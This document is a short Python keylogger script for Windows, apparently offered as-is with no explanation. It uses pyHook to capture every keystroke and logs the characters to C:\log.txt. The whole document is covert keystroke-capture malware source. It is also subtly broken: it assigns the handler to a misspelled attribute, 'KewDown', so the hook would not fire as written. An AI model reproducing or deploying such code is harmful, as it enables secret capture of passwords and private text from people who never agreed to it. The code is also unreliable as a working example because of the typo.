import pyHook,pythoncom,sys,logging
file_log='C:\log.txt'

def KeyEvent(event):
    logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hm = pyHook.HookManager()
hm.KewDown=KeyEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
